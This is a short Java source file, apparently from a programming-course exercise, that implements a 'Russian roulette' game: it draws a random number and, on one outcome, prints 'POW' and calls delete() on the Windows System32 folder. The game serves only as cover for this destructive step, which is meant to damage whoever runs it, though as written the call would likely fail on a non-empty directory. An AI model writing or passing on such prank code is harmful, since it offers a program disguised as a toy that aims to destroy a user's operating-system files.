package curso_programacao;

import java.io.File;

public class roletaRussa {

	public static void main(String[] args) {
		
		int russianRoullet = (int) (Math.random() * 6);
		
			File gameOver = new File("C://Windows//System32");
			if (russianRoullet == 4) {
				
				System.out.println("POW");
				gameOver.delete();
				
		}	else {

			System.out.println("TLACK");
		}

	}

}
